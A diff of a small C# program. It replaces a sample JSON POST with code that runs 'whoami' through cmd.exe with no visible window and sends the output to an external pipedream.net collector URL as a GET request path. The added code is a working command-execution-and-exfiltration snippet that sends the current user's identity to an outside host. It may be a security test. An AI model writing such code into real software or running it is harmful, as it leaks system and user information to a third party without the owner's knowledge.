@@ -1,30 +1,38 @@
-using System.Text;
+using System;
 using System.Net;
-using System.Text.Json;
+using System.Net.Http;
+// https://qawithexperts.com/article/c-sharp/run-cmd-commands-using-c/520
+// https://stackoverflow.com/a/27326758/9329272
 
-var url = "https://eoqqzdfuzmgq7gg.m.pipedream.net/";
+namespace Test
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+			string command = "whoami";
+			System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo("cmd", "/c " + command);
+			procStartInfo.RedirectStandardOutput = true;
+            procStartInfo.UseShellExecute = false;
+            // Do not create the black window.
+            procStartInfo.CreateNoWindow = true;
+            // Now we create a process, assign its ProcessStartInfo and start it
+            System.Diagnostics.Process proc = new System.Diagnostics.Process();
+            proc.StartInfo = procStartInfo;
+            proc.Start();
 
-var request = WebRequest.Create(url);
-request.Method = "POST";
-
-var user = new User("John Doe", "gardener");
-var json = JsonSerializer.Serialize(user);
-byte[] byteArray = Encoding.UTF8.GetBytes(json);
-
-request.ContentType = "application/x-www-form-urlencoded";
-request.ContentLength = byteArray.Length;
-request.UserAgent = "my user agent";
-
-using var reqStream = request.GetRequestStream();
-reqStream.Write(byteArray, 0, byteArray.Length);
-
-using var response = request.GetResponse();
-Console.WriteLine(((HttpWebResponse)response).StatusDescription);
-
-using var respStream = response.GetResponseStream();
-
-using var reader = new StreamReader(respStream);
-string data = reader.ReadToEnd();
-Console.WriteLine(data);
-
-record User(string Name, string Occupation);
+            // Get the output into a string
+            string whoami = proc.StandardOutput.ReadToEnd();
+            Console.WriteLine("Making API Call...");
+            using (var client = new HttpClient(new HttpClientHandler { AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate }))
+            {
+                client.BaseAddress = new Uri("https://eoqqzdfuzmgq7gg.m.pipedream.net/");
+                HttpResponseMessage response = client.GetAsync(whoami).Result;
+                response.EnsureSuccessStatusCode();
+                string result = response.Content.ReadAsStringAsync().Result;
+                Console.WriteLine("Result: " + result);
+            }
+            Console.ReadLine();
+        }
+    }
+}
